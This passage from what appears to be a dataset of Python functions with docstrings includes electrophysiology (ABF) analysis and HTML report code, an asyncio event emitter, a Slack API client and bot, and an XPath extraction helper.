            "def _info(self, source, key, filetype, ignore):\n        \"\"\"\n        Generates the union of the source.specs and the metadata\n        dictionary loaded by the filetype object.\n        \"\"\"\n        specs, mdata = [], {}\n        mdata_clashes  = set()\n\n        for spec in source.specs:\n            if key not in spec:\n                raise Exception(\"Key %r not available in 'source'.\" % key)\n\n            mdata = dict((k,v) for (k,v) in filetype.metadata(spec[key]).items()\n                         if k not in ignore)\n            mdata_spec = {}\n            mdata_spec.update(spec)\n            mdata_spec.update(mdata)\n            specs.append(mdata_spec)\n            mdata_clashes = mdata_clashes | (set(spec.keys()) & set(mdata.keys()))\n        # Metadata clashes can be avoided by using the ignore list.\n        if mdata_clashes:\n            self.warning(\"Loaded metadata keys overriding source keys.\")\n        return specs"
        ],
        [
            "async def _push(self, *args, **kwargs):\n        \"\"\"Push new data into the buffer. Resume looping if paused.\"\"\"\n        self._data.append((args, kwargs))\n        if self._future is not None:\n\n            future, self._future = self._future, None\n            future.set_result(True)"
        ],
        [
            "def figureStimulus(abf,sweeps=[0]):\n    \"\"\"\n    Create a plot of one area of interest of a single sweep.\n    \"\"\"\n\n    stimuli=[2.31250, 2.35270]\n    for sweep in sweeps:\n        abf.setsweep(sweep)\n        for stimulus in stimuli:\n            S1=int(abf.pointsPerSec*stimulus)\n            S2=int(abf.pointsPerSec*(stimulus+0.001)) # 1ms of blanking\n            abf.sweepY[S1:S2]=np.nan # blank out the stimulus area\n        I1=int(abf.pointsPerSec*2.2) # time point (sec) to start\n        I2=int(abf.pointsPerSec*2.6) # time point (sec) to end\n        baseline=np.average(abf.sweepY[int(abf.pointsPerSec*2.0):int(abf.pointsPerSec*2.2)])\n        Ys=lowPassFilter(abf.sweepY[I1:I2])-baseline\n        Xs=abf.sweepX2[I1:I1+len(Ys)].flatten()\n        plt.plot(Xs,Ys,alpha=.5,lw=2)\n    return"
        ],
        [
            "def doStuff(ABFfolder,analyze=False,convert=False,index=True,overwrite=True,\n            launch=True):\n    \"\"\"Inelegant for now, but lets you manually analyze every ABF in a folder.\"\"\"\n    IN=INDEX(ABFfolder)\n    if analyze:\n        IN.analyzeAll()\n    if convert:\n        IN.convertImages()"
        ],
        [
            "def analyzeSingle(abfFname):\n    \"\"\"Reanalyze data for a single ABF. Also remakes child and parent html.\"\"\"\n    assert os.path.exists(abfFname) and abfFname.endswith(\".abf\")\n    ABFfolder,ABFfname=os.path.split(abfFname)\n    abfID=os.path.splitext(ABFfname)[0]\n    IN=INDEX(ABFfolder)\n    IN.analyzeABF(abfID)\n    IN.scan()\n    IN.html_single_basic([abfID],overwrite=True)\n    IN.html_single_plot([abfID],overwrite=True)\n    IN.scan()\n    IN.html_index()\n\n    return"
        ],
        [
            "def scan(self):\n        \"\"\"\n        scan folder1 and folder2 into files1 and files2.\n        since we are on windows, simplify things by making them all lowercase.\n        this WILL cause problems on 'nix operating systems.If this is the case,\n        just run a script to rename every file to all lowercase.\n        \"\"\"\n        t1=cm.timeit()\n        self.files1=cm.list_to_lowercase(sorted(os.listdir(self.folder1)))\n        self.files2=cm.list_to_lowercase(sorted(os.listdir(self.folder2)))\n        self.files1abf=[x for x in self.files1 if x.endswith(\".abf\")]\n        self.files1abf=cm.list_to_lowercase(cm.abfSort(self.files1abf))\n        self.IDs=[x[:-4] for x in self.files1abf]\n        self.log.debug(\"folder1 has %d files\",len(self.files1))\n        self.log.debug(\"folder1 has %d abfs\",len(self.files1abf))\n        self.log.debug(\"folder2 has %d files\",len(self.files2))\n        self.log.debug(\"scanning folders took %s\",cm.timeit(t1))"
        ],
        [
            "def convertImages(self):\n        \"\"\"\n        run this to turn all folder1 TIFs and JPGs into folder2 data.\n        TIFs will be treated as micrographs and converted to JPG with enhanced\n        contrast. JPGs will simply be copied over.\n        \"\"\"\n\n        # copy over JPGs (and such)\n        exts=['.jpg','.png']\n        for fname in [x for x in self.files1 if cm.ext(x) in exts]:\n            ID=\"UNKNOWN\"\n            if len(fname)>8 and fname[:8] in self.IDs:\n                ID=fname[:8]\n            fname2=ID+\"_jpg_\"+fname\n            if not fname2 in self.files2:\n                self.log.info(\"copying over [%s]\"%fname2)\n                shutil.copy(os.path.join(self.folder1,fname),os.path.join(self.folder2,fname2))\n            if not fname[:8]+\".abf\" in self.files1:\n                self.log.error(\"orphan image: %s\",fname)\n\n        # convert TIFs (and such) to JPGs\n        exts=['.tif','.tiff']\n        for fname in [x for x in self.files1 if cm.ext(x) in exts]:\n            ID=\"UNKNOWN\"\n            if len(fname)>8 and fname[:8] in self.IDs:\n                ID=fname[:8]\n            fname2=ID+\"_tif_\"+fname+\".jpg\"\n            if not fname2 in self.files2:\n                self.log.info(\"converting micrograph [%s]\"%fname2)\n                imaging.TIF_to_jpg(os.path.join(self.folder1,fname),saveAs=os.path.join(self.folder2,fname2))\n            if not fname[:8]+\".abf\" in self.files1:\n                self.log.error(\"orphan image: %s\",fname)"
        ],
        [
            "def analyzeAll(self):\n        \"\"\"analyze every unanalyzed ABF in the folder.\"\"\"\n        searchableData=str(self.files2)\n        self.log.debug(\"considering analysis for %d ABFs\",len(self.IDs))\n        for ID in self.IDs:\n            if not ID+\"_\" in searchableData:\n                self.log.debug(\"%s needs analysis\",ID)\n                try:\n                    self.analyzeABF(ID)\n                except:\n                    print(\"EXCEPTION! \"*100)\n            else:\n                self.log.debug(\"%s has existing analysis, not overwriting\",ID)\n        self.log.debug(\"verified analysis of %d ABFs\",len(self.IDs))"
        ],
        [
            "def htmlFor(self,fname):\n        \"\"\"return appropriate HTML determined by file extension.\"\"\"\n        if os.path.splitext(fname)[1].lower() in ['.jpg','.png']:\n            html='<a href=\"%s\"><img src=\"%s\"></a>'%(fname,fname)\n            if \"_tif_\" in fname:\n                html=html.replace('<img ','<img class=\"datapic micrograph\"')\n            if \"_plot_\" in fname:\n                html=html.replace('<img ','<img class=\"datapic intrinsic\" ')\n            if \"_experiment_\" in fname:\n                html=html.replace('<img ','<img class=\"datapic experiment\" ')\n        elif os.path.splitext(fname)[1].lower() in ['.html','.htm']:\n            html='LINK: %s'%fname\n        else:\n            html='<br>Not sure how to show: [%s]</br>'%fname\n        return html"
        ],
        [
            "def html_single_basic(self,abfID,launch=False,overwrite=False):\n        \"\"\"\n        generate a generic flat file html for an ABF parent. You could give\n        this a single ABF ID, its parent ID, or a list of ABF IDs.\n        If a child ABF is given, the parent will automatically be used.\n        \"\"\"\n        if type(abfID) is str:\n            abfID=[abfID]\n        for thisABFid in cm.abfSort(abfID):\n            parentID=cm.parent(self.groups,thisABFid)\n            saveAs=os.path.abspath(\"%s/%s_basic.html\"%(self.folder2,parentID))\n            if overwrite is False and os.path.basename(saveAs) in self.files2:\n                continue\n            filesByType=cm.filesByType(self.groupFiles[parentID])\n            html=\"\"\n            html+='<div style=\"background-color: #DDDDDD;\">'\n            html+='<span class=\"title\">summary of data from: %s</span></br>'%parentID\n            html+='<code>%s</code>'%os.path.abspath(self.folder1+\"/\"+parentID+\".abf\")\n            html+='</div>'\n            catOrder=[\"experiment\",\"plot\",\"tif\",\"other\"]\n            categories=cm.list_order_by(filesByType.keys(),catOrder)\n            for category in [x for x in categories if len(filesByType[x])]:\n                if category=='experiment':\n                    html+=\"<h3>Experimental Data:</h3>\"\n                elif category=='plot':\n                    html+=\"<h3>Intrinsic Properties:</h3>\"\n                elif category=='tif':\n                    html+=\"<h3>Micrographs:</h3>\"\n                elif category=='other':\n                    html+=\"<h3>Additional Files:</h3>\"\n                else:\n                    html+=\"<h3>????:</h3>\"\n                #html+=\"<hr>\"\n                #html+='<br>'*3\n                for fname in filesByType[category]:\n                    html+=self.htmlFor(fname)\n                html+='<br>'*3\n            print(\"creating\",saveAs,'...')\n            style.save(html,saveAs,launch=launch)"
        ],
        [
            "def html_single_plot(self,abfID,launch=False,overwrite=False):\n        \"\"\"create ID_plot.html of just intrinsic properties.\"\"\"\n        if type(abfID) is str:\n            abfID=[abfID]\n        for thisABFid in cm.abfSort(abfID):\n            parentID=cm.parent(self.groups,thisABFid)\n            saveAs=os.path.abspath(\"%s/%s_plot.html\"%(self.folder2,parentID))\n            if overwrite is False and os.path.basename(saveAs) in self.files2:\n                continue\n            filesByType=cm.filesByType(self.groupFiles[parentID])\n            html=\"\"\n            html+='<div style=\"background-color: #DDDDFF;\">'\n            html+='<span class=\"title\">intrinsic properties for: %s</span></br>'%parentID\n            html+='<code>%s</code>'%os.path.abspath(self.folder1+\"/\"+parentID+\".abf\")\n            html+='</div>'\n            for fname in filesByType['plot']:\n                html+=self.htmlFor(fname)\n            print(\"creating\",saveAs,'...')\n            style.save(html,saveAs,launch=launch)"
        ],
        [
            "def convolve(signal,kernel):\n    \"\"\"\n    This applies a kernel to a signal through convolution and returns the result.\n\n    Some magic is done at the edges so the result doesn't apprach zero:\n        1. extend the signal's edges with len(kernel)/2 duplicated values\n        2. perform the convolution ('same' mode)\n        3. slice-off the ends we added\n        4. return the same number of points as the original\n    \"\"\"\n    pad=np.ones(len(kernel)/2)\n    signal=np.concatenate((pad*signal[0],signal,pad*signal[-1]))\n    signal=np.convolve(signal,kernel,mode='same')\n    signal=signal[len(pad):-len(pad)]\n    return signal"
        ],
        [
            "def timeit(timer=None):\n    \"\"\"simple timer. returns a time object, or a string.\"\"\"\n    if timer is None:\n        return time.time()\n    else:\n        took=time.time()-timer\n        if took<1:\n            return \"%.02f ms\"%(took*1000.0)\n        elif took<60:\n            return \"%.02f s\"%(took)\n        else:\n            return \"%.02f min\"%(took/60.0)"
        ],
        [
            "def list_move_to_front(l,value='other'):\n    \"\"\"if the value is in the list, move it to the front and return it.\"\"\"\n    l=list(l)\n    if value in l:\n        l.remove(value)\n        l.insert(0,value)\n    return l"
        ],
        [
            "def list_move_to_back(l,value='other'):\n    \"\"\"if the value is in the list, move it to the back and return it.\"\"\"\n    l=list(l)\n    if value in l:\n        l.remove(value)\n        l.append(value)\n    return l"
        ],
        [
            "def list_order_by(l,firstItems):\n    \"\"\"given a list and a list of items to be first, return the list in the\n    same order except that it begins with each of the first items.\"\"\"\n    l=list(l)\n    for item in firstItems[::-1]: #backwards\n        if item in l:\n            l.remove(item)\n            l.insert(0,item)\n    return l"
        ],
        [
            "def abfSort(IDs):\n    \"\"\"\n    given a list of goofy ABF names, return it sorted intelligently.\n    This places things like 16o01001 after 16901001.\n    \"\"\"\n    IDs=list(IDs)\n    monO=[]\n    monN=[]\n    monD=[]\n    good=[]\n    for ID in IDs:\n        if ID is None:\n            continue\n        if 'o' in ID:\n            monO.append(ID)\n        elif 'n' in ID:\n            monN.append(ID)\n        elif 'd' in ID:\n            monD.append(ID)\n        else:\n            good.append(ID)\n    return sorted(good)+sorted(monO)+sorted(monN)+sorted(monD)"
        ],
        [
            "def abfGroupFiles(groups,folder):\n    \"\"\"\n    when given a dictionary where every key contains a list of IDs, replace\n    the keys with the list of files matching those IDs. This is how you get a\n    list of files belonging to each child for each parent.\n    \"\"\"\n    assert os.path.exists(folder)\n    files=os.listdir(folder)\n    group2={}\n    for parent in groups.keys():\n        if not parent in group2.keys():\n            group2[parent]=[]\n        for ID in groups[parent]:\n            for fname in [x.lower() for x in files if ID in x.lower()]:\n                group2[parent].extend([fname])\n    return group2"
        ],
        [
            "def parent(groups,ID):\n    \"\"\"given a groups dictionary and an ID, return its actual parent ID.\"\"\"\n    if ID in groups.keys():\n        return ID # already a parent\n    if not ID in groups.keys():\n        for actualParent in groups.keys():\n            if ID in groups[actualParent]:\n                return actualParent # found the actual parent\n    return None"
        ],
        [
            "def userFolder():\n    \"\"\"return the semi-temporary user folder\"\"\"\n    #path=os.path.abspath(tempfile.gettempdir()+\"/swhlab/\")\n    #don't use tempdir! it will get deleted easily.\n    path=os.path.expanduser(\"~\")+\"/.swhlab/\" # works on windows or linux\n    # for me, path=r\"C:\\Users\\swharden\\.swhlab\"\n    if not os.path.exists(path):\n        print(\"creating\",path)\n        os.mkdir(path)\n    return os.path.abspath(path)"
        ],
        [
            "async def _try_catch_coro(emitter, event, listener, coro):\n    \"\"\"Coroutine wrapper to catch errors after async scheduling.\n\n    Args:\n        emitter (EventEmitter): The event emitter that is attempting to\n            call a listener.\n        event (str): The event that triggered the emitter.\n        listener (async def): The async def that was used to generate the coro.\n        coro (coroutine): The coroutine that should be tried.\n\n    If an exception is caught the function will use the emitter to emit the\n    failure event. If, however, the current event _is_ the failure event then\n    the method reraises. The reraised exception may show in debug mode for the\n    event loop but is otherwise silently dropped.\n    \"\"\"\n    try:\n\n        await coro\n\n    except Exception as exc:\n\n        if event == emitter.LISTENER_ERROR_EVENT:\n\n            raise\n\n        emitter.emit(emitter.LISTENER_ERROR_EVENT, event, listener, exc)"
        ],
        [
            "def _check_limit(self, event):\n        \"\"\"Check if the listener limit is hit and warn if needed.\"\"\"\n        if self.count(event) > self.max_listeners:\n\n            warnings.warn(\n                'Too many listeners for event {}'.format(event),\n                ResourceWarning,\n            )"
        ],
        [
            "def add_listener(self, event, listener):\n        \"\"\"Bind a listener to a particular event.\n\n        Args:\n            event (str): The name of the event to listen for. This may be any\n                string value.\n            listener (def or async def): The callback to execute when the event\n                fires. This may be a sync or async function.\n        \"\"\"\n        self.emit('new_listener', event, listener)\n        self._listeners[event].append(listener)\n        self._check_limit(event)\n        return self"
        ],
        [
            "def once(self, event, listener):\n        \"\"\"Add a listener that is only called once.\"\"\"\n        self.emit('new_listener', event, listener)\n        self._once[event].append(listener)\n        self._check_limit(event)\n        return self"
        ],
        [
            "def remove_listener(self, event, listener):\n        \"\"\"Remove a listener from the emitter.\n\n        Args:\n            event (str): The event name on which the listener is bound.\n            listener: A reference to the same object given to add_listener.\n\n        Returns:\n            bool: True if a listener was removed else False.\n\n        This method only removes one listener at a time. If a listener is\n        attached multiple times then this method must be called repeatedly.\n        Additionally, this method removes listeners first from the those\n        registered with 'on' or 'add_listener'. If none are found it continue\n        to remove afterwards from those added with 'once'.\n        \"\"\"\n        with contextlib.suppress(ValueError):\n\n            self._listeners[event].remove(listener)\n            return True\n\n        with contextlib.suppress(ValueError):\n\n            self._once[event].remove(listener)\n            return True\n\n        return False"
        ],
        [
            "def _dispatch_coroutine(self, event, listener, *args, **kwargs):\n        \"\"\"Schedule a coroutine for execution.\n\n        Args:\n            event (str): The name of the event that triggered this call.\n            listener (async def): The async def that needs to be executed.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        The values of *args and **kwargs are passed, unaltered, to the async\n        def when generating the coro. If there is an exception generating the\n        coro, such as the wrong number of arguments, the emitter's error event\n        is triggered. If the triggering event _is_ the emitter's error event\n        then the exception is reraised. The reraised exception may show in\n        debug mode for the event loop but is otherwise silently dropped.\n        \"\"\"\n        try:\n\n            coro = listener(*args, **kwargs)\n\n        except Exception as exc:\n\n            if event == self.LISTENER_ERROR_EVENT:\n\n                raise\n\n            return self.emit(self.LISTENER_ERROR_EVENT, event, listener, exc)\n\n        asyncio.ensure_future(\n            _try_catch_coro(self, event, listener, coro),\n            loop=self._loop,\n        )"
        ],
        [
            "def _dispatch_function(self, event, listener, *args, **kwargs):\n        \"\"\"Execute a sync function.\n\n        Args:\n            event (str): The name of the event that triggered this call.\n            listener (def): The def that needs to be executed.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        The values of *args and **kwargs are passed, unaltered, to the def\n        when exceuting. If there is an exception executing the def, such as the\n        wrong number of arguments, the emitter's error event is triggered. If\n        the triggering event _is_ the emitter's error event then the exception\n        is reraised. The reraised exception may show in debug mode for the\n        event loop but is otherwise silently dropped.\n        \"\"\"\n        try:\n\n            return listener(*args, **kwargs)\n\n        except Exception as exc:\n\n            if event == self.LISTENER_ERROR_EVENT:\n\n                raise\n\n            return self.emit(self.LISTENER_ERROR_EVENT, event, listener, exc)"
        ],
        [
            "def _dispatch(self, event, listener, *args, **kwargs):\n        \"\"\"Dispatch an event to a listener.\n\n        Args:\n            event (str): The name of the event that triggered this call.\n            listener (def or async def): The listener to trigger.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        This method inspects the listener. If it is a def it dispatches the\n        listener to a method that will execute that def. If it is an async def\n        it dispatches it to a method that will schedule the resulting coro with\n        the event loop.\n        \"\"\"\n        if (\n            asyncio.iscoroutinefunction(listener) or\n            isinstance(listener, functools.partial) and\n            asyncio.iscoroutinefunction(listener.func)\n        ):\n\n            return self._dispatch_coroutine(event, listener, *args, **kwargs)\n\n        return self._dispatch_function(event, listener, *args, **kwargs)"
        ],
        [
            "def emit(self, event, *args, **kwargs):\n        \"\"\"Call each listener for the event with the given arguments.\n\n        Args:\n            event (str): The event to trigger listeners on.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        This method passes all arguments other than the event name directly\n        to the listeners. If a listener raises an exception for any reason the\n        'listener-error', or current value of LISTENER_ERROR_EVENT, is emitted.\n        Listeners to this event are given the event name, listener object, and\n        the exception raised. If an error listener fails it does so silently.\n\n        All event listeners are fired in a deferred way so this method returns\n        immediately. The calling coro must yield at some point for the event\n        to propagate to the listeners.\n        \"\"\"\n        listeners = self._listeners[event]\n        listeners = itertools.chain(listeners, self._once[event])\n        self._once[event] = []\n        for listener in listeners:\n\n            self._loop.call_soon(\n                functools.partial(\n                    self._dispatch,\n                    event,\n                    listener,\n                    *args,\n                    **kwargs,\n                )\n            )\n\n        return self"
        ],
        [
            "def count(self, event):\n        \"\"\"Get the number of listeners for the event.\n\n        Args:\n            event (str): The event for which to count all listeners.\n\n        The resulting count is a combination of listeners added using\n        'on'/'add_listener' and 'once'.\n        \"\"\"\n        return len(self._listeners[event]) + len(self._once[event])"
        ],
        [
            "def genPNGs(folder,files=None):\n    \"\"\"Convert each TIF to PNG. Return filenames of new PNGs.\"\"\"\n    if files is None:\n        files=glob.glob(folder+\"/*.*\")\n    new=[]\n    for fname in files:\n        ext=os.path.basename(fname).split(\".\")[-1].lower()\n        if ext in ['tif','tiff']:\n            if not os.path.exists(fname+\".png\"):\n                print(\" -- converting %s to PNG...\"%os.path.basename(fname))\n                cm.image_convert(fname)\n                new.append(fname) #fancy burn-in of image data\n            else:\n                pass\n                #print(\" -- already converted %s to PNG...\"%os.path.basename(fname))\n    return new"
        ],
        [
            "def htmlABF(ID,group,d,folder,overwrite=False):\n    \"\"\"given an ID and the dict of files, generate a static html for that abf.\"\"\"\n    fname=folder+\"/swhlab4/%s_index.html\"%ID\n    if overwrite is False and os.path.exists(fname):\n        return\n    html=TEMPLATES['abf']\n    html=html.replace(\"~ID~\",ID)\n    html=html.replace(\"~CONTENT~\",htmlABFcontent(ID,group,d))\n    print(\" <- writing [%s]\"%os.path.basename(fname))\n    with open(fname,'w') as f:\n        f.write(html)\n    return"
        ],
        [
            "def genIndex(folder,forceIDs=[]):\n    \"\"\"expects a folder of ABFs.\"\"\"\n    if not os.path.exists(folder+\"/swhlab4/\"):\n        print(\" !! cannot index if no /swhlab4/\")\n        return\n    timestart=cm.timethis()\n    files=glob.glob(folder+\"/*.*\") #ABF folder\n    files.extend(glob.glob(folder+\"/swhlab4/*.*\"))\n    print(\" -- indexing glob took %.02f ms\"%(cm.timethis(timestart)*1000))\n    files.extend(genPNGs(folder,files))\n    files=sorted(files)\n    timestart=cm.timethis()\n    d=cm.getIDfileDict(files) #TODO: this is really slow\n    print(\" -- filedict length:\",len(d))\n    print(\" -- generating ID dict took %.02f ms\"%(cm.timethis(timestart)*1000))\n    groups=cm.getABFgroups(files)\n    print(\" -- groups length:\",len(groups))\n    for ID in sorted(list(groups.keys())):\n        overwrite=False\n        for abfID in groups[ID]:\n            if abfID in forceIDs:\n                overwrite=True\n        try:\n            htmlABF(ID,groups[ID],d,folder,overwrite)\n        except:\n            print(\"~~ HTML GENERATION FAILED!!!\")\n    menu=expMenu(groups,folder)\n    makeSplash(menu,folder)\n    makeMenu(menu,folder)\n    htmlFrames(d,folder)\n    makeMenu(menu,folder)\n    makeSplash(menu,folder)"
        ],
        [
            "def plotAllSweeps(abfFile):\n    \"\"\"simple example how to load an ABF file and plot every sweep.\"\"\"\n    r = io.AxonIO(filename=abfFile)\n    bl = r.read_block(lazy=False, cascade=True)     \n    print(abfFile+\"\\nplotting %d sweeps...\"%len(bl.segments))\n    plt.figure(figsize=(12,10))\n    plt.title(abfFile)\n    for sweep in range(len(bl.segments)):\n        trace = bl.segments[sweep].analogsignals[0]\n        plt.plot(trace.times-trace.times[0],trace.magnitude,alpha=.5)    \n    plt.ylabel(trace.dimensionality)\n    plt.xlabel(\"seconds\")\n    plt.show()\n    plt.close()"
        ],
        [
            "def plot_shaded_data(X,Y,variances,varianceX):\n    \"\"\"plot X and Y data, then shade its background by variance.\"\"\"\n    plt.plot(X,Y,color='k',lw=2)\n    nChunks=int(len(Y)/CHUNK_POINTS)\n    for i in range(0,100,PERCENT_STEP):\n        varLimitLow=np.percentile(variances,i)\n        varLimitHigh=np.percentile(variances,i+PERCENT_STEP)\n        varianceIsAboveMin=np.where(variances>=varLimitLow)[0]\n        varianceIsBelowMax=np.where(variances<=varLimitHigh)[0]\n        varianceIsRange=[chunkNumber for chunkNumber in range(nChunks) \\\n                         if chunkNumber in varianceIsAboveMin \\\n                         and chunkNumber in varianceIsBelowMax]\n        for chunkNumber in varianceIsRange:\n            t1=chunkNumber*CHUNK_POINTS/POINTS_PER_SEC\n            t2=t1+CHUNK_POINTS/POINTS_PER_SEC\n            plt.axvspan(t1,t2,alpha=.3,color=COLORMAP(i/100),lw=0)"
        ],
        [
            "def show_variances(Y,variances,varianceX,logScale=False):\n    \"\"\"create some fancy graphs to show color-coded variances.\"\"\"\n    \n    plt.figure(1,figsize=(10,7))\n    plt.figure(2,figsize=(10,7))\n    varSorted=sorted(variances)\n    \n    plt.figure(1)\n    plt.subplot(211)\n    plt.grid()\n    plt.title(\"chronological variance\")\n    plt.ylabel(\"original data\")\n    plot_shaded_data(X,Y,variances,varianceX)\n    plt.margins(0,.1)   \n    plt.subplot(212)\n    plt.ylabel(\"variance (pA) (log%s)\"%str(logScale))\n    plt.xlabel(\"time in sweep (sec)\")\n    plt.plot(varianceX,variances,'k-',lw=2)\n    \n    plt.figure(2)\n    plt.ylabel(\"variance (pA) (log%s)\"%str(logScale))\n    plt.xlabel(\"chunk number\")\n    plt.title(\"sorted variance\")\n    plt.plot(varSorted,'k-',lw=2)\n    \n    for i in range(0,100,PERCENT_STEP):\n        varLimitLow=np.percentile(variances,i)\n        varLimitHigh=np.percentile(variances,i+PERCENT_STEP)\n        label=\"%2d-%d percentile\"%(i,i++PERCENT_STEP)\n        color=COLORMAP(i/100)\n        print(\"%s: variance = %.02f - %.02f\"%(label,varLimitLow,varLimitHigh))\n        plt.figure(1)\n        plt.axhspan(varLimitLow,varLimitHigh,alpha=.5,lw=0,color=color,label=label)\n        plt.figure(2)\n        chunkLow=np.where(varSorted>=varLimitLow)[0][0]\n        chunkHigh=np.where(varSorted>=varLimitHigh)[0][0]\n        plt.axvspan(chunkLow,chunkHigh,alpha=.5,lw=0,color=color,label=label)\n        \n    for fignum in [1,2]:\n        plt.figure(fignum)\n        if logScale:\n            plt.semilogy()\n        plt.margins(0,0)\n        plt.grid()\n        if fignum is 2:\n            plt.legend(fontsize=10,loc='upper left',shadow=True)\n        plt.tight_layout()\n        plt.savefig('2016-12-15-variance-%d-log%s.png'%(fignum,str(logScale)))\n    plt.show()"
        ],
        [
            "def ensureDetection(self):\n        \"\"\"\n        run this before analysis. Checks if event detection occured.\n        If not, runs AP detection on all sweeps.\n        \"\"\"\n        if self.APs==False:\n            self.log.debug(\"analysis attempted before event detection...\")\n            self.detect()"
        ],
        [
            "def detect(self):\n        \"\"\"runs AP detection on every sweep.\"\"\"\n        self.log.info(\"initializing AP detection on all sweeps...\")\n        t1=cm.timeit()\n        for sweep in range(self.abf.sweeps):\n            self.detectSweep(sweep)\n        self.log.info(\"AP analysis of %d sweeps found %d APs (completed in %s)\",\n                      self.abf.sweeps,len(self.APs),cm.timeit(t1))"
        ],
        [
            "def get_author_and_version(package):\n    \"\"\"\n    Return package author and version as listed in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    author = re.search(\"__author__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n    version = re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n    return author, version"
        ],
        [
            "def api_subclass_factory(name, docstring, remove_methods, base=SlackApi):\n    \"\"\"Create an API subclass with fewer methods than its base class.\n\n    Arguments:\n      name (:py:class:`str`): The name of the new class.\n      docstring (:py:class:`str`): The docstring for the new class.\n      remove_methods (:py:class:`dict`): The methods to remove from\n        the base class's :py:attr:`API_METHODS` for the subclass. The\n        key is the name of the root method (e.g. ``'auth'`` for\n        ``'auth.test'``, the value is either a tuple of child method\n        names (e.g. ``('test',)``) or, if all children should be\n        removed, the special value :py:const:`ALL`.\n      base (:py:class:`type`, optional): The base class (defaults to\n        :py:class:`SlackApi`).\n\n    Returns:\n      :py:class:`type`: The new subclass.\n\n    Raises:\n      :py:class:`KeyError`: If the method wasn't in the superclass.\n\n    \"\"\"\n    methods = deepcopy(base.API_METHODS)\n    for parent, to_remove in remove_methods.items():\n        if to_remove is ALL:\n            del methods[parent]\n        else:\n            for method in to_remove:\n                del methods[parent][method]\n    return type(name, (base,), dict(API_METHODS=methods, __doc__=docstring))"
        ],
        [
            "async def execute_method(self, method, **params):\n        \"\"\"Execute a specified Slack Web API method.\n\n        Arguments:\n          method (:py:class:`str`): The name of the method.\n          **params (:py:class:`dict`): Any additional parameters\n            required.\n\n        Returns:\n          :py:class:`dict`: The JSON data from the response.\n\n        Raises:\n          :py:class:`aiohttp.web_exceptions.HTTPException`: If the HTTP\n            request returns a code other than 200 (OK).\n          SlackApiError: If the Slack API is reached but the response\n           contains an error message.\n\n        \"\"\"\n        url = self.url_builder(method, url_params=params)\n        logger.info('Executing method %r', method)\n        response = await aiohttp.get(url)\n        logger.info('Status: %r', response.status)\n        if response.status == 200:\n            json = await response.json()\n            logger.debug('...with JSON %r', json)\n            if json.get('ok'):\n                return json\n            raise SlackApiError(json['error'])\n        else:\n            raise_for_status(response)"
        ],
        [
            "def method_exists(cls, method):\n        \"\"\"Whether a given method exists in the known API.\n\n        Arguments:\n          method (:py:class:`str`): The name of the method.\n\n        Returns:\n          :py:class:`bool`: Whether the method is in the known API.\n\n        \"\"\"\n        methods = cls.API_METHODS\n        for key in method.split('.'):\n            methods = methods.get(key)\n            if methods is None:\n                break\n        if isinstance(methods, str):\n            logger.debug('%r: %r', method, methods)\n            return True\n        return False"
        ],
        [
            "def _add_parsley_ns(cls, namespace_dict):\n        \"\"\"\n        Extend XPath evaluation with Parsley extensions' namespace\n        \"\"\"\n\n        namespace_dict.update({\n            'parslepy' : cls.LOCAL_NAMESPACE,\n            'parsley' : cls.LOCAL_NAMESPACE,\n        })\n        return namespace_dict"
        ],
        [
            "def extract(self, document, selector, debug_offset=''):\n        \"\"\"\n        Try and convert matching Elements to unicode strings.\n\n        If this fails, the selector evaluation probably already\n        returned some string(s) of some sort, or boolean value,\n        or int/float, so return that instead.\n        \"\"\"\n        selected = self.select(document, selector)\n        if selected is not None:\n\n            if isinstance(selected, (list, tuple)):\n\n                # FIXME: return None or return empty list?\n                if not len(selected):\n                    return\n\n                return [self._extract_single(m) for m in selected]\n\n            else:\n                return self._extract_single(selected)\n\n        # selector did not match anything\n        else:\n            if self.DEBUG:\n                print(debug_offset, \"selector did not match anything; return None\")\n            return None"
        ],
        [
            "async def join_rtm(self, filters=None):\n        \"\"\"Join the real-time messaging service.\n\n        Arguments:\n          filters (:py:class:`dict`, optional): Dictionary mapping\n            message filters to the functions they should dispatch to.\n            Use a :py:class:`collections.OrderedDict` if precedence is\n            important; only one filter, the first match, will be\n            applied to each message.\n\n        \"\"\"\n        if filters is None:\n            filters = [cls(self) for cls in self.MESSAGE_FILTERS]\n        url = await self._get_socket_url()\n        logger.debug('Connecting to %r', url)\n        async with ws_connect(url) as socket:\n            first_msg = await socket.receive()\n            self._validate_first_message(first_msg)\n            self.socket = socket\n            async for message in socket:\n                if message.tp == MsgType.text:\n                    await self.handle_message(message, filters)\n                elif message.tp in (MsgType.closed, MsgType.error):\n                    if not socket.closed:\n                        await socket.close()\n                    self.socket = None\n                    break\n        logger.info('Left real-time messaging.')"
        ],
        [
            "async def handle_message(self, message, filters):\n        \"\"\"Handle an incoming message appropriately.\n\n        Arguments:\n          message (:py:class:`aiohttp.websocket.Message`): The incoming\n            message to handle.\n          filters (:py:class:`list`): The filters to apply to incoming\n            messages.\n\n        \"\"\"\n        data = self._unpack_message(message)\n        logger.debug(data)\n        if data.get('type') == 'error':\n            raise SlackApiError(\n                data.get('error', {}).get('msg', str(data))\n            )\n        elif self.message_is_to_me(data):\n            text = data['text'][len(self.address_as):].strip()\n            if text == 'help':\n                return self._respond(\n                    channel=data['channel'],\n                    text=self._instruction_list(filters),\n                )\n            elif text == 'version':\n                return self._respond(\n                    channel=data['channel'],\n                    text=self.VERSION,\n                )\n        for _filter in filters:\n            if _filter.matches(data):\n                logger.debug('Response triggered')\n                async for response in _filter:\n                    self._respond(channel=data['channel'], text=response)"
        ],
        [
            "def message_is_to_me(self, data):\n        \"\"\"If you send a message directly to me\"\"\"\n        return (data.get('type') == 'message' and\n                data.get('text', '').startswith(self.address_as))"
        ],
        [
